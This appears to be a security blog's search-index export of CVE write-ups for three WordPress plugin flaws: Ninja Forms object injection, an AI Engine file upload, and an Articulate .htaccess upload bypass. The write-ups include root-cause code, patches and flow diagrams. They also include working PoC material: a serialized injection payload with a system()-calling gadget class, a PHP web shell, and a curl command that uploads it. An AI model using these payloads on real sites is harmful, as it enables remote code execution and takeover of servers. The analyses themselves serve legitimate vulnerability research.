POC","uri":"/posts/2025-11-14-cve-2025-9083/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rThe vulnerability originates from the extractSubmissions() function inside the FieldsetRepeater.php file: if(is_string($fieldSubmissionValue)){ $fieldSubmissionValue = maybe_unserialize($fieldSubmissionValue); } maybe_unserialize() is called without any protection against PHP Object Injection. Bug and patch\rThe patch replaces maybe_unserialize() with unserialize() and disables object creation using ['allowed_classes' =\u003e false], preventing PHP Object Injection altogether. ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rClass name\rThe class name corresponds to a layout field when creating a blank form with the plugin. Create form with Repeatable Fieldset\rCreate a form with Repeatable Fieldset, then drag a Single Line Text field into it as input, and embed the form into a post or page. Embed form into post\rPublish the post and submit the form with a payload value: Request test with `payload`\rWe see that all data is assigned to the formData parameter. Copy the URL-decoded content into an online JSON formatter: https://jsonformatter.org/ Formatted JSON data\rObserving the debugger shows the similarity: Debugger data\r$fieldSubmissionValue corresponds to the value of the field with ID 8. Thus, when value is a string, it triggers maybe_unserialize(). We create a class and place it in wp-config.php to test the invocation when maybe_unserialize() runs: class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } Resubmit the request with a serialized payload as the new value. Because the payload is wrapped inside JSON, quotes must be escaped (\\\") to avoid breaking the JSON structure. Change the value to serialized string\rValue inside debugger\rShell execution occurs → Deserialization is triggered. Deserialization triggered\rCallstack flow: The application registers an AJAX handler for unauthenticated users: if( isset( $_POST['formData'] ) ) { $this-\u003e_form_data = json_decode( $_POST['formData'], TRUE ); // php5.2 fallback if( ! $this-\u003e_form_data ) $this-\u003e_form_data = json_decode( stripslashes( $_POST['formData'] ), TRUE ); } add_action( 'wp_ajax_nopriv_nf_ajax_submit', array( $this, 'submit' ) ); This means when sending a POST request to /wp-admin/admin-ajax.php with action=nf_ajax_submit, the submit callback is triggered. A fully submitted form follows this call flow: Callstack diagram\r","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\r","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rUse the plugin to create a blank form with a Single Line Text field inside a Repeatable Fieldset, then embed it in a post/page. Submit the form and intercept the request using Burp Suite. Replace the value of the field with a serialized payload instead of JSON. \"O:15:\\\"ObjectInjection\\\":1:{s:7:\\\"command\\\";s:4:\\\"ls /\\\";}\" Resend the request. Tip To test locally, create a class with a __wakeup() magic method that triggers upon deserialization, and place it in wp-config.php: class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-9083 vulnerability stems from using maybe_unserialize() on user-controlled input without any class restriction or validation. This enables unauthenticated attackers to execute arbitrary code if a suitable gadget exists within WordPress or other plugins/themes. The 3.11.1 patch completely prevents object creation by switching to unserialize() with ['allowed_classes' =\u003e false], effectively mitigating the root cause of the PHP Object Injection. ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rmaybe_unserialize() is extremely dangerous when applied to user input. A single gadget anywhere in the codebase can lead to Remote Code Execution. WordPress AJAX endpoints exposed to unauthenticated users are high-value targets. JSON embedding requires careful escaping of serialized payloads to avoid breaking structure. The 3.11.1 patch demonstrates that controlling allowed classes during unserialization is a critical defensive measure. ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Ninja Forms Plugin \u003c 3.11.1 is vulnerable to PHP Object Injection ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress AI Engine Plugin.","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe AI Engine plugin for WordPress contains an arbitrary file upload vulnerability due to missing file type validation in the rest_simpleFileUpload() function in versions 2.9.3 and 2.9.4. This allows authenticated attackers (attackers with authentication), with Subscriber-level privileges or higher, to upload arbitrary files to the affected website’s server when the REST API is enabled, which can lead to remote code execution (RCE). CVE ID: CVE-2025-7847 Vulnerability Type: Arbitrary File Upload Affected Versions: 2.9.3-2.9.4 Patched Versions: 2.9.5 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress AI Engine Plugin ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - AI Engine: 2.9.4 – vulnerable 2.9.5 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rThe vulnerability occurs because the upload handling function writes files directly (copy(), file_put_contents()) without checking file type or authenticating the user, allowing an attacker to upload arbitrary files (including .php) into the uploads directory and execute malicious code. Validate file type\r// Validate filename extension for base64 uploads $validate = wp_check_filetype( $filename ); if ( $validate['type'] == false ) { throw new Exception( 'File type is not allowed.' ); } The patch added file type checks in the simpleFileUpload and upload_file functions using wp_check_filetype() to only allow uploads for valid formats based on WordPress’s whitelist. ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis\rThe plugin registers several public APIs via the rest_api_init() function public function rest_api_init() { $public_api = $this-\u003ecore-\u003eget_option( 'public_api' ); if ( !$public_api ) { return; } $this-\u003ebearer_token = $this-\u003ecore-\u003eget_option( 'public_api_bearer_token' ); if ( !empty( $this-\u003ebearer_token ) ) { add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 ); } register_rest_route( 'mwai/v1', '/simpleFileUpload', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'rest_simpleFileUpload' ], 'permission_callback' =\u003e function ( $request ) { return $this-\u003ecore-\u003ecan_access_public_api( 'simpleFileUpload', $request ); }, ] ); ... } The function checks whether the Public API option is enabled. According to the plugin documentation, this option is disabled by default: By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System). You can enable it in the Admin Dashboard at wp-admin/admin.php?page=mwai_settings\u0026nekoTab=settings enable the REST API\rAccording to the description, when this option is enabled, only authenticated API requests are accepted. There are two authentication methods: X-WP-Nonce: Obtained via the JavaScript object wpApiSettings for logged-in users (Subscriber+) Bearer Token: Configured by the admin $this-\u003ebearer_token = $this-\u003ecore-\u003eget_option( 'public_api_bearer_token' ); if ( !empty( $this-\u003ebearer_token ) ) { add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 ); } When a Bearer Token is set, the plugin registers a filter named mwai_allow_public_api, with the callback being the method auth_via_bearer_token. register_rest_route( 'mwai/v1', '/simpleFileUpload', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'rest_simpleFileUpload' ], 'permission_callback' =\u003e function ( $request ) { return $this-\u003ecore-\u003ecan_access_public_api( 'simpleFileUpload', $request ); }, ] ); An API is registered with method POST: Endpoint: /wp-json/mwai/v1/simpleFileUpload Callback: rest_simpleFileUpload With permission_callback being the return value of can_access_public_api() public function can_access_public_api( $feature, $extra ) { $logged_in = is_user_logged_in(); return apply_filters( 'mwai_allow_public_api', $logged_in, $feature, $extra ); } In the WP REST API, the function is_user_logged_in() will return: true: If the user is logged in and the X-WP-Nonce header is valid false: If the user is not logged in or the X-WP-Nonce header is invalid can_access_public_api will call the mwai_allow_public_api filter registered above =\u003e auth_via_bearer_token($logged_in, $feature, $extra) is invoked public function auth_via_bearer_token( $allow, $feature, $extra ) { if ( !empty( $extra ) \u0026\u0026 !empty( $extra-\u003eget_header( 'Authorization' ) ) ) { $token = $extra-\u003eget_header( 'Authorization' ); $token = str_replace( 'Bearer ', '', $token ); if ( $token === $this-\u003ebearer_token ) { // We set the current user to the first admin. $admin = $this-\u003ecore-\u003eget_admin_user(); wp_set_current_user( $admin-\u003eID, $admin-\u003euser_login ); return true; } } return $allow; } The auth_via_bearer_token() function authenticates using a Bearer Token. Its process: If the request has an Authorization header containing Bearer \u003ctoken\u003e and the \u003ctoken\u003e value matches the token stored in the option ($this-\u003ebearer_token), then: Set the current user to the first admin (wp_set_current_user()), Return true → allow API access. If absent or the token is incorrect → return $allow, i.e., the initial result from is_user_logged_in(). Info\rBy default, there will be no Bearer Token for authentication, so we rely on a valid X-WP-Nonce of a Subscriber user =\u003e permission_callback=true public function rest_simpleFileUpload( $request ) { try { $params = $request-\u003e","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension → newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"]\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension → newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"]\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension → newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"]\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension → newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"]\r","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a web shell \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Upload the web shell curl -X POST \\ \"http://localhost/wp-json/mwai/v1/simpleFileUpload\" \\ -H \"X-WP-Nonce: 51e6c4a45a\" \\ -F \"file=@rce.php\" \\ -b \"wp-settings-time-1=1762427921; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce; wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=9d30c6b076551e37fb4ed7968fd5de98; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762706307%7C3gOEpWVViHcurttDwNTWxn1b5CWvZGdOajkR5cjzW3e%7Cda0f415f7f042d4095dbeac711e1742cc23db9ea1d020adbae5c385a36b65b98; wp-settings-5=mfold%3Do; wp-settings-time-5=1762533510\" \\ --proxy 127.0.0.1:8080 # Burp proxy File uploaded successfully\rRCE with the web shell RCE via uploaded file\r","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-7847 is a serious arbitrary file upload vulnerability in AI Engine 2.9.3–2.9.4, allowing authenticated users (Subscriber+) to upload arbitrary files to the server via the REST API, leading to RCE. Version 2.9.5 fixes the issue by adding file type checks (wp_check_filetype). ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rThe vulnerability only applies when the Public REST API is enabled and the user has a valid X-WP-Nonce or a Bearer token. Root cause: missing file type validation and directly copying the file into uploads. Mitigation: update the plugin to 2.9.5. ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress AI Engine Plugin 2.9.3-2.9.4 is vulnerable to Arbitrary File Upload ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"A list of 'sink' points in WordPress — where input data can lead to the execution of malicious actions.","date":"2025-11-13","objectID":"/posts/2025-11-13-wordpress-vulnerability-sink/","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/posts/2025-11-13-wordpress-vulnerability-sink/"},{"categories":["CVE Analysis"],"collections":null,"content":"Why This Article?\r","date":"2025-11-13","objectID":"/posts/2025-11-13-wordpress-vulnerability-sink/:1:0","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/posts/2025-11-13-wordpress-vulnerability-sink/#why-this-article"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Embed Articulate Content into WordPress Plugin.","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rAn Arbitrary File Upload vulnerability in Brian Batt - elearningfreak.com for the Insert or Embed Articulate Content into WordPress plugin allows uploading a Web Shell to the web server. This issue affects Insert or Embed Articulate Content into WordPress: from n/a to 4.3000000025. CVE ID: CVE-2025-32202 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 4.3000000025 Patched Versions: 4.3000000026 CVSS severity: Medium (9.1) Required Privilege: Editor Product: WordPress Embed Articulate Content into WordPress Plugin ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Embed Articulate Content into WordPress: 4.3000000025 – vulnerable 4.3000000026 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rThe vulnerability lies in the articulate_has_php_file() function at /wp-content/plugins/insert-or-embed-articulate-content-into-wordpress/functions.php due to insufficient checks, allowing an attacker to upload a .htaccess file to override handling in the uploads directory; as a result, subsequently uploaded files with attacker-chosen extensions (e.g., .abc, .xnxx) can be executed as PHP. Adding a check for .htaccess\rThe patch added a condition to check for .htaccess on upload to prevent this vulnerability. ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis\rThe plugin registers an action hook for logged-in users add_action( 'wp_ajax_articulate_upload_file', 'articulate_upload_ajax_file' ); So when accessing the endpoint /wp-admin/admin-ajax.php with param action=articulate_upload_file, the callback articulate_upload_ajax_file is invoked function articulate_upload_ajax_file() { articulate_setup_php_ini(); check_ajax_referer( 'articulate_upload_file' ); if ( ! is_user_logged_in() || ! current_user_can( 'upload_files' ) || ! current_user_can( 'unfiltered_html' ) ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'You do not have permissions to upload this file. Contact your admin to get the unfiltered_html capability.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } $count_dirs = getDirs(); // you can use WP's wp_handle_upload() function: $file = $_FILES['async-upload']; $dir = untrailingslashit( getUploadsPath() ); if ( empty( $_FILES ) || $_FILES['async-upload']['error'] ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to move uploaded file. Please check if the folder has write permissions.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } $chunk = isset( $_REQUEST['chunk'] ) ? intval( $_REQUEST['chunk'] ) : 0; $chunks = isset( $_REQUEST['chunks'] ) ? intval( $_REQUEST['chunks'] ) : 0; $fileName = isset( $_REQUEST['name'] ) ? sanitize_file_name( $_REQUEST['name'] ) : sanitize_file_name( $_FILES['async-upload']['name'] ); $filePath = '' . $dir . '/' . sanitize_file_name( $fileName ) . ''; // Open temp file $out = @fopen( \"{$filePath}.part\", $chunk == 0 ? 'wb' : 'ab' ); if ( $out ) { // Read binary input stream and append it to temp file $in = @fopen( $_FILES['async-upload']['tmp_name'], 'rb' ); if ( $in ) { while ( $buff = fread( $in, 4096 ) ) { fwrite( $out, $buff ); } } else { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to open input stream. Please check if the folder has write permissions', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } @fclose( $in ); @fclose( $out ); @unlink( $_FILES['async-upload']['tmp_name'] ); } else { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to open output stream. Please check if the folder has write permissions', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } // Security check. $mime = wp_check_filetype( $filePath ); $mimes = get_allowed_mime_types( get_current_user_id() ); if ( ! isset( $mime['type'] ) || ! in_array( $mime['type'], array_values( $mimes ) ) ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to upload this file for security reasons. Contact your admin to ensure your user can access all mime types from get_allowed_mime_types.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } // Check if file has been uploaded if ( ! $chunks || $chunk == $chunks - 1 ) { // Strip the temp .part suffix off articulate_custom_rename( \"{$filePath}.part\", $filePath ); // start extracting // unzip file $dir = explode( '.', $fileName ); $dir[0] = str_replace( ' ', '_', $dir[0] ); $target = getUploadsPath() . $dir[0]; $file = $filePath; while ( file_exists( $target ) ) { $r = rand( 1, 10 ); $target .= $r; $dir[0] .= $r; } $arr = extractZip( $file, $target, $dir[0] ); unlink( $filePath ); do_action( hook_name: 'iea/uploaded_quiz', $arr, $target ); $ok = isset( $arr[4] ) ? $arr[4] : 0; $response = array( 'OK' =\u003e $ok, 'info' =\u003e $arr[0], 'folder' =\u003e $arr[2], 'path' =\u003e $arr[1], 'name' =\u003e $arr[3], 'target' =\u003e $target, ); die( json_encode( $response ) ); } else { die( json_encode( array( 'OK' =\u003e 1, 'info' =\u003e __( 'Uploading chunks!', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } exit; }; The articulate_upload_ajax_file() function handles AJAX file uploads for the plugin. Specifically: Initialization \u0026 basic security articulate_setup_php_ini(); check_ajax_referer( 'articulate_upload_file' ); articulate_setup_php_ini() — adjusts PHP settings (usually to allow larger uploads, longer timeouts, etc.). check_a","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"]\rH --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"}\rI -- Yes --\u003e J[\"articulate_rrmdir($target) → delete folder → return error\"]\rI -- No --\u003e K[\"(❌ Missing check for .htaccess file)\"]\rK --\u003e L[\"Attacker uploads ZIP containing .htaccess\"]\rL --\u003e M[\".htaccess overrides Apache handler in upload dir\"]\rM --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"]\rN --\u003e O[\"→ Arbitrary File Upload → Remote Code Execution (RCE)\"]\r%% Patch branch\rK --\u003e P[\"✅ [Patched] articulate_has_php_file() adds '.htaccess' check\"]\rP --\u003e Q[\"Upload blocked if .htaccess detected\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"]\rH --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"}\rI -- Yes --\u003e J[\"articulate_rrmdir($target) → delete folder → return error\"]\rI -- No --\u003e K[\"(❌ Missing check for .htaccess file)\"]\rK --\u003e L[\"Attacker uploads ZIP containing .htaccess\"]\rL --\u003e M[\".htaccess overrides Apache handler in upload dir\"]\rM --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"]\rN --\u003e O[\"→ Arbitrary File Upload → Remote Code Execution (RCE)\"]\r%% Patch branch\rK --\u003e P[\"✅ [Patched] articulate_has_php_file() adds '.htaccess' check\"]\rP --\u003e Q[\"Upload blocked if .htaccess detected\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] 